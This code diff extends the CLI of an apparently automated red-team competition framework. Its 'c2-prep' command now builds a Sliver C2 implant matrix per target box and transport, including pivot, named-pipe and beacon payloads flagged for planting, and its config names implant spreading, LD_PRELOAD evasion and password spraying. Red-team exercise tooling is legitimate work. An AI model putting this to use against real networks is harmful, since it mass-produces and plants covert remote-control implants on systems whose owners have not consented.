@@ -20,14 +20,19 @@ CONFIG_CONTRACT = (
     "c2.callback_wait_sec",
     "c2.callback_max_age_sec",
     "c2.callback_port",
+    "c2.dns_domain",
     "c2.enabled",
+    "c2.engine",
     "c2.implant_spread",
     "c2.operation",
+    "c2.operator_config",
     "c2.password_env",
     "c2.task_timeout_sec",
+    "c2.transports",
     "c2.username",
     "c2.verify_tls",
     "evasion.preload_so",
+    "clef.api_key_env",
     "clef.base_url",
     "clef.enabled",
     "clef.high_stakes_effects",
@@ -53,6 +58,7 @@ CONFIG_CONTRACT = (
     "limits.spray_delay_sec",
     "limits.spray_probe_timeout",
     "limits.unreachable_halt_after",
+    "red.opening_takedown_min",
     "llm.api_key_env",
     "llm.base_url",
     "llm.enabled",
@@ -215,7 +221,8 @@ def cmd_report(args):
     ctx, policy, _ = run_mod.build_context(cfg, comp_dir=cfg["run"].get("comp_dir"))
     paths = report_mod.write_artifacts(cfg["run"]["state_dir"], ctx.world,
                                       policy=policy, sensors=ctx.sensors,
-                                      out_dir=args.out)
+                                      out_dir=args.out, c2=ctx.c2,
+                                      comp_dir=cfg["run"].get("comp_dir"))
     print(json.dumps(paths, indent=2))
     return 0
 
@@ -251,29 +258,95 @@ def cmd_c2_prep(args):
     comp_dir = Path(cfg["run"].get("comp_dir") or ".")
     if not cfg["c2"].get("enabled"):
         print(json.dumps({"ok": False,
-                          "error": "c2.enabled is false — set the Mythic URL/credentials "
+                          "error": "c2.enabled is false — set the C2 endpoint "
                                    "before comp-prep"}))
         return 2
     ctx, _, _ = run_mod.build_context(cfg, comp_dir=comp_dir)
     client = ctx.c2
+    engine = str(cfg["c2"].get("engine") or "sliver").lower()
     out_dir = comp_dir / "red" / "payloads"
     out_dir.mkdir(parents=True, exist_ok=True)
-    manifest = {"comp": cfg["run"].get("comp"), "operation": cfg["c2"].get("operation"),
-                "transports": list(args.transports.split(",")), "boxes": {}}
-    for box in ctx.intel.boxes():
-        box_id = f"{box['box']}-{box['identifier']}"
-        for transport in manifest["transports"]:
-            entry = client.build_payload(box_id, "windows" if box["windows"] else "linux",
-                                        transport=transport)
-            entry["file"] = f"{box_id}-{transport}.bin"
-            manifest["boxes"][f"{box_id}:{transport}"] = entry
-            if not args.no_download:
-                client.download_payload(entry["uuid"], out_dir / entry["file"])
+    transports = _transports_arg(args.transports)
+    manifest = {"comp": cfg["run"].get("comp"),
+                "operation": cfg["c2"].get("operation") or "sliver",
+                "engine": engine, "dns_domain": cfg["c2"].get("dns_domain"),
+                "transports": transports, "boxes": {}}
+    if engine == "sliver":
+        _prep_sliver(ctx, client, out_dir, manifest, transports,
+                     write=not args.no_download)
+    else:
+        for box in ctx.intel.boxes():
+            box_id = f"{box['box']}-{box['identifier']}"
+            for transport in transports:
+                entry = client.build_payload(
+                    box_id, "windows" if box["windows"] else "linux",
+                    transport=transport)
+                entry["file"] = f"{box_id}-{transport}.bin"
+                manifest["boxes"][f"{box_id}:{transport}"] = entry
+                if not args.no_download:
+                    client.download_payload(entry["uuid"], out_dir / entry["file"])
     manifest_path = out_dir / "manifest.json"
     manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
     print(json.dumps({"ok": True, "manifest": str(manifest_path),
                       "payloads": len(manifest["boxes"])}, indent=2))
     return 0
+
+
+def _transports_arg(raw):
+    from .c2 import TRANSPORTS
+    names = [name.strip() for name in str(raw or "all").split(",") if name.strip()]
+    if not names or names == ["all"]:
+        return list(TRANSPORTS)
+    unknown = [name for name in names if name not in TRANSPORTS]
+    if unknown:
+        raise ConfigError(f"unknown Sliver transport(s) {unknown}; "
+                          f"choose from {list(TRANSPORTS)}")
+    return names
+
+
+def _prep_sliver(ctx, client, out_dir, manifest, transports, *, write=True):
+    from concurrent.futures import ThreadPoolExecutor
+    from .c2 import PIVOT_TRANSPORTS
+    client.ensure_listeners()
+    beacons = {"mtls"} & set(transports)
+    jobs = []
+    for box in ctx.intel.boxes():
+        box_id = f"{box['box']}-{box['identifier']}"
+        os_name = "windows" if box["windows"] else "linux"
+        gateway = f"192.168.{box['identifier']}.1"
+        for transport in transports:
+            if transport == "named-pipe" and os_name != "windows":
+                continue
+            jobs.append({"box_id": box_id, "os": os_name, "gateway": gateway,
+                         "transport": transport,
+                         "pivot_host": box["ip"] if transport in PIVOT_TRANSPORTS else None,
+                         "beacon": False})
+            if transport in beacons:
+                jobs.append({**jobs[-1], "beacon": True})
+
+    def _build(job):
+        entry = client.build_payload(
+            job["box_id"], job["os"], transport=job["transport"],
+            gateway=job["gateway"], pivot_host=job["pivot_host"],
+            beacon=job["beacon"])
+        entry["file"] = (f"{entry['name']}."
+                         f"{'exe' if job['os'] == 'windows' else 'bin'}")
+        entry["pivot"] = job["transport"] in PIVOT_TRANSPORTS
+        # Pivots need a parent listener and beacons are the alternate control
+        # path; both are built and shipped, not seeded blind.
+        entry["plant"] = (not job["beacon"]
+                          and job["transport"] not in PIVOT_TRANSPORTS)
+        return entry
+
+    # Sliver's Go importer is not re-entrant across concurrent Generate calls
+    # (two Windows builds collided on src/runc/cgroup), so the matrix is serial.
+    with ThreadPoolExecutor(max_workers=1) as pool:
+        built = list(pool.map(_build, jobs))
+    for entry in built:
+        data = entry.pop("data")
+        if write:
+            (out_dir / entry["file"]).write_bytes(data)
+        manifest["boxes"][entry["name"]] = entry
 
 
 def build_parser():
@@ -321,7 +394,8 @@ def build_parser():
     vc_p.set_defaults(func=cmd_verify_config)
 
     prep_p = sub.add_parser("c2-prep", help="build + freeze the payload matrix")
-    prep_p.add_argument("--transports", default="http,webhook")
+    prep_p.add_argument("--transports", default="all",
+                        help="comma list, or all (every Sliver transport)")
     prep_p.add_argument("--no-download", action="store_true")
     prep_p.set_defaults(func=cmd_c2_prep)
     return parser
